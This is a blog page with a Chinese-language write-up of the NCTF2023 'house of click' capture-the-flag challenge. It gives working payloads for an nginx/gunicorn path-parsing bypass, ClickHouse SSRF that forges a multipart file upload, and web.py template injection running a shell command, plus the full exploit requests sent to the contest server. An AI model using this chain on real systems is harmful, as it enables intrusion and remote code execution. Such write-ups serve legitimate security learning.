@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html><head lang="en">
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>NCTF2023 house of click writeup - xlccccc&#39;s blog</title><link rel="icon" type="image/png" href=/img/logo.jpg /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="去年NCTF啥都不会，今年当坏人抢了两个一血（" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="NCTF2023 house of click writeup" />
+<meta property="og:description" content="去年NCTF啥都不会，今年当坏人抢了两个一血（" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.xlccccc.top/posts/nctf2023-house-of-click-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-20T12:28:18+08:00" />
+<meta property="article:modified_time" content="2023-12-20T12:28:18+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="NCTF2023 house of click writeup"/>
+<meta name="twitter:description" content="去年NCTF啥都不会，今年当坏人抢了两个一血（"/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://blog.xlccccc.top/css/main.4c58ba3f18cfa5d36cd339b82d5e62d8805118eaa92db1ce302a0f8a114a664d.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://blog.xlccccc.top/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://blog.xlccccc.top/">xlccccc&#39;s blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">Archives</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://blog.xlccccc.top/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">NCTF2023 house of click writeup</h1>
+			<div class="meta">Posted on Dec 20, 2023</div>
+		</div>
+		<div class = "toc-wrapper">
+			
+<div class="post-toc" id="post-toc">
+<aside>
+    <header>
+    <h1>NCTF2023 house of click writeup</h1>
+    </header>
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#前言">前言</a></li>
+        <li><a href="#审计">审计</a></li>
+        <li><a href="#解析绕过">解析绕过</a></li>
+        <li><a href="#clickhouse-ssrf">clickhouse ssrf</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</aside>
+<a href="#" id="toc-toggle"></a>
+</div>
+
+
+
+			</div>
+		
+
+		<section class="body">
+			<h2 id="前言">前言</h2>
+<p>在0ctf做那道clickhouse就被狠狠折磨了，当时看了一天的官方文档，但是在官方文档中并没有对jdbc的详细解释，当时也主要在看hdfs和mysql就没做出来</p>
+<p>这次X1r0z师傅也出了一道clickhouse的题，过程也很折磨，不过相比于0ctf那题，思路是非常清晰的，做题体验还是挺好的，师傅太强了</p>
+<h2 id="审计">审计</h2>
+<p>拿到题看完run.py，第一时间就能发现可以通过clickhouse来ssrf到upload路由，然后利用<code>os.path.join</code>的特性对<code>/app/templates</code>中上传一个模板文件再通过index路由渲染从而rce</p>
+<p>但是访问题目环境发现<code>/</code>路由是nginx的默认页面，并不是run.py的<code>/</code>路由，看一眼nginx.conf发现只对<code>/api/</code>下做了代理，也就是run.py的<code>/query</code>和<code>/</code>都无法直接访问到</p>
+<p>第一时间想到的是请求走私，<del>毕竟web.py看起来是一个不常见的web框架</del>（指我没见过）</p>
+<p>在官方仓库里搜了一下chunked发现这里是对大小写敏感的</p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled.png" alt="Untitled"></p>
+<p>而nginx是对大小写不敏感的，也就是说这里存在<code>TE-CL</code>类型的请求走私</p>
+<p>Front将http包解析为分块编码从而认为是一个包，而Backend按CL解析认为是两个包</p>
+<p>以portswigger的一题举例</p>
+<p>Front</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">0a76007c03e5740a8215987300590023.web-security-academy.net</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-length<span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5c
+</span></span><span style="display:flex;"><span>GPOST / HTTP/1.1
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 15
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x=1
+</span></span><span style="display:flex;"><span>0
+</span></span></code></pre></div><p>Backend</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">0a76007c03e5740a8215987300590023.web-security-academy.net</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-length<span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>GPOST / HTTP/1.1
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 15
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x=1
+</span></span><span style="display:flex;"><span>0
+</span></span></code></pre></div><p>自己改源码手动调始终都接不到两个包，后来折腾了一下vscode调试，发现Backend确实是按CL解析的，但是Content-Length的长度是后面那个包总长，并没有按传的长度解析，这里不太清除是nginx的问题还是gunicorn的问题，便没有深入研究了</p>
+<h2 id="解析绕过">解析绕过</h2>
+<p>自己对gunicorn也不太了解，这题发了hint后搜了下就知道了</p>
+<p><a href="https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/">https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/</a></p>
+<p>当nginx&lt;1.21.1时与gunicorn搭配会有解析漏洞</p>
+<p>简单来说就是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// 请求
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">/private&lt;TAB&gt;HTTP/1.1/../../public</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// nginx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">/public</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// gunicorn
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">/private&lt;TAB&gt;HTTP/1.1</span>
+</span></span></code></pre></div><p>于是便可以访问到/private目录</p>
+<p>所以只需要构造出如下payload便可访问到query和/了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/query	HTTP/1.1/../../api/upload</span>
+</span></span></code></pre></div><h2 id="clickhouse-ssrf">clickhouse ssrf</h2>
+<p>接下来便是clickhouse ssrf上传文件了</p>
+<p><a href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url">https://clickhouse.com/docs/zh/sql-reference/table-functions/url</a></p>
+<p>首先是获取token，在clickhouse中我们可以用url来请求远程数据，于是我们编写出如下payload来获取token</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> url(<span style="color:#e6db74">&#39;http://backend:8001/api/token&#39;</span>,CSV)
+</span></span></code></pre></div><p>由于没有回显，并不能直接拿到token（可以盲注，但是没必要）</p>
+<p>因为url支持添加headers，所以我们只需嵌套一下就好了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> url(<span style="color:#e6db74">&#39;http://backend:8001/api/upload&#39;</span>,CSV,headers(<span style="color:#e6db74">&#39;X-Access-Token&#39;</span><span style="color:#f92672">=</span>(<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> url(<span style="color:#e6db74">&#39;http://backend:8001/api/token&#39;</span>,CSV))));
+</span></span></code></pre></div><p>但是/api/upload路由接收的是POST请求，select只能发送GET请求</p>
+<p>不过文档说了，<code>insert</code>可以发送POST请求</p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%201.png" alt="Untitled"></p>
+<p>那么问题来了，我们如何执行insert语句呢？</p>
+<p>因为我们的语句是拼接在select之后的</p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%202.png" alt="Untitled"></p>
+<p>以select作为主语的话是不能执行insert的</p>
+<p>这里在搜寻其它发送POST数据的方法无果后，发现可以通过http interface来执行insert语句</p>
+<p>clickhouse为了方便在任何语言任何平台使用，提供了http客户端</p>
+<p><a href="https://clickhouse.com/docs/zh/interfaces/http">https://clickhouse.com/docs/zh/interfaces/http</a></p>
+<p>我们只需要知道账号密码，便可以通过GET请求来执行sql语句</p>
+<p>insert的问题解决了，最后是发包的问题</p>
+<p>因为使用<code>INSERT INTO FUNCTION url()</code> 是以分块编码形式发送的</p>
+<p>而接收数据需要<code>multipart/form-data</code>格式</p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%203.png" alt="Untitled"></p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%204.png" alt="Untitled"></p>
+<p>这里经过了简单的尝试，发现只要在headers里加上</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">multipart</span><span style="color:#f92672">/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span>
+</span></span></code></pre></div><p>backend就会按multipart解析</p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%205.png" alt="Untitled"></p>
+<p>所以最后就是编一个用分块编码发的数据，但是backend可以解析为multipart的格式</p>
+<p>这里用的数据格式是<code>RowBinary</code></p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%206.png" alt="Untitled"></p>
+<p>发送的数据是这样的，里面的数据是可以解析\r\n等符号的，所以编写出如下insert语句便可以成功写入文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#66d9ef">FUNCTION</span> url(<span style="color:#e6db74">&#39;http://backend:8001/api/upload&#39;</span>, <span style="color:#e6db74">&#39;RowBinary&#39;</span>,headers(<span style="color:#e6db74">&#39;X-Access-Token&#39;</span><span style="color:#f92672">=</span>(<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> url(<span style="color:#e6db74">&#39;http://backend:8001/api/token&#39;</span>,CSV)),<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;multipart/form-data; boundary=boundary&#39;</span>), <span style="color:#e6db74">&#39;myfile String&#39;</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;\r\n--boundary\r\nContent-Disposition: form-data; name=&#34;x&#34;\r\n\r\nfoo\r\n--boundary\r\nContent-Disposition: form-data; name=&#34;myfile&#34;; filename=&#34;/app/templates/test.html&#34;\r\nContent-Type: text/plain\r\n\r\naaa\r\n--boundary--\r\n&#39;</span>)
+</span></span></code></pre></div><p>至于模板注入</p>
+<p><a href="https://webpy.org/docs/0.3/templetor.zh-cn">https://webpy.org/docs/0.3/templetor.zh-cn</a></p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%207.png" alt="Untitled"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>code:
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;you can write any python code here&#34;</span>
+</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>title()
+</span></span><span style="display:flex;"><span>    z <span style="color:#f92672">=</span> len(x <span style="color:#f92672">+</span> y)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">limit</span>(s, width<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;limits a string to the given width&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> __import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;/readflag&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>limit(x)
+</span></span></code></pre></div><p>最终考虑一下编码和引号问题，便能完成rce了</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /query	HTTP/1.1/../../api/upload <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">124.71.184.68:8013</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34; Not A;Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;104&#34;</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;Windows&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">none</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">navigate</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-User<span style="color:#f92672">:</span> <span style="color:#ae81ff">?1</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">document</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">lang=zh-CN</span>
+</span></span><span style="display:flex;"><span>If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;60aced88-264&#34;</span>
+</span></span><span style="display:flex;"><span>If-Modified-Since<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 25 May 2021 12:28:56 GMT</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1910</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id=1%20union%20all%20select%20%271%27%2C%272%27%2C%273%27%20from%20url%28%27http%3A%2F%2Flocalhost%3A8123%3Fuser%3Ddefault%26password%3Ddefault%26query%3DINSERT%2520INTO%2520FUNCTION%2520url%2528%2527http%253A%252F%252Fbackend%253A8001%252Fapi%252Fupload%2527%252C%2520%2527RowBinary%2527%252Cheaders%2528%2527X%252DAccess%252DToken%2527%253D%2528select%2520%252A%2520from%2520url%2528%2527http%253A%252F%252Fbackend%253A8001%252Fapi%252Ftoken%2527%252CCSV%2529%2529%252C%2527Content%252DType%2527%253D%2527multipart%252Fform%252Ddata%253B%2520boundary%253Dboundary%2527%2529%252C%2520%2527myfile%2520String%2527%2529%2520VALUES%2520%2528%2527%255Cr%255Cn%252D%252Dboundary%255Cr%255CnContent%252DDisposition%253A%2520form%252Ddata%253B%2520name%253D%2522x%2522%255Cr%255Cn%255Cr%255Cnfoo%255Cr%255Cn%252D%252Dboundary%255Cr%255CnContent%252DDisposition%253A%2520form%252Ddata%253B%2520name%253D%2522myfile%2522%253B%2520filename%253D%2522%252Fapp%252Ftemplates%252Ftest%252Ehtml%2522%255Cr%255CnContent%252DType%253A%2520text%252Fplain%255Cr%255Cn%255Cr%255Cn%2524code%253A%255Cr%255Cn%2520%2520%2520%2520x%2520%253D%2520%2522you%2520can%2520write%2520any%2520python%2520code%2520here%2522%255Cr%255Cn%2520%2520%2520%2520y%2520%253D%2520x%252Etitle%2528%2529%255Cr%255Cn%2520%2520%2520%2520z%2520%253D%2520len%2528x%2520%252B%2520y%2529%255Cr%255Cn%2520%2520%2520%2520%255Cr%255Cn%2520%2520%2520%2520def%2520limit%2528s%252C%2520width%253D10%2529%253A%255Cr%255Cn%2520%2520%2520%2520%2520%2520%2520%2520%2522%2522%2522limits%2520a%2520string%2520to%2520the%2520given%2520width%2522%2522%2522%255Cr%255Cn%2520%2520%2520%2520%2520%2520%2520%2520return%2520%255F%255Fimport%255F%255F%2528%255C%2527os%255C%2527%2529%252Epopen%2528%255C%2527%252Freadflag%255C%2527%2529%252Eread%2528%2529%255Cr%255Cn%255Cr%255Cn%2524limit%2528x%2529%255Cr%255Cn%252D%252Dboundary%252D%252D%255Cr%255Cn%2527%2529%27%2C%27CSV%27%29
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /	HTTP/1.1/../../api/upload <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">124.71.184.68:8013</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34; Not A;Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;104&#34;</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;Windows&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">none</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">navigate</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-User<span style="color:#f92672">:</span> <span style="color:#ae81ff">?1</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">document</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">lang=zh-CN</span>
+</span></span><span style="display:flex;"><span>If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;60aced88-264&#34;</span>
+</span></span><span style="display:flex;"><span>If-Modified-Since<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 25 May 2021 12:28:56 GMT</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name=test
+</span></span></code></pre></div><p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%208.png" alt="Untitled"></p>
+<p><img src="/img/NCTF2023%20house%20of%20click%20writeup/Untitled%209.png" alt="Untitled"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+					<li><a href="/tags/web">web</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		
+		
+		<script>
+  function getGiscusTheme() {
+    const quartoTheme = localStorage.getItem("theme-storage");
+    const giscusTheme = quartoTheme === "dark" ? "dark" : "light";
+    return giscusTheme;
+  }
+
+  function setGiscusTheme() {
+    function sendMessage(message) {
+      const iframe = document.querySelector("iframe.giscus-frame");
+      if (!iframe) return;
+      iframe.contentWindow.postMessage(
+        { giscus: message },
+        "https://giscus.app"
+      );
+    }
+
+    sendMessage({
+      setConfig: {
+        theme: getGiscusTheme(),
+      },
+    });
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const giscusAttributes = {
+      src: "https://giscus.app/client.js",
+      "data-repo": "xlccccc\/blog",
+      "data-repo-id": "R_kgDOK5uYSw",
+      "data-category": "",
+      "data-category-id": "DIC_kwDOK5uYS84CbvAb",
+      "data-mapping": "pathname",
+      "data-strict": "0",
+      "data-reactions-enabled": "1",
+      "data-emit-metadata": "0",
+      "data-input-position": "bottom",
+      "data-theme": getGiscusTheme(),
+      "data-lang": "zh-CN",
+      crossorigin: "anonymous",
+      async: "",
+    };
+
+    
+    const giscusScript = document.createElement("script");
+    Object.entries(giscusAttributes).forEach(([key, value]) =>
+      giscusScript.setAttribute(key, value)
+    );
+
+    
+    const article = document.querySelector("article");
+    if (article) {
+      article.appendChild(giscusScript);
+    }
+
+    
+    const toggle = document.querySelector("#dark-mode-toggle");
+    if (toggle) {
+      toggle.addEventListener("click", setGiscusTheme);
+    }
+  });
+</script>
+
+		
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/xlccccc" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © Athul |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
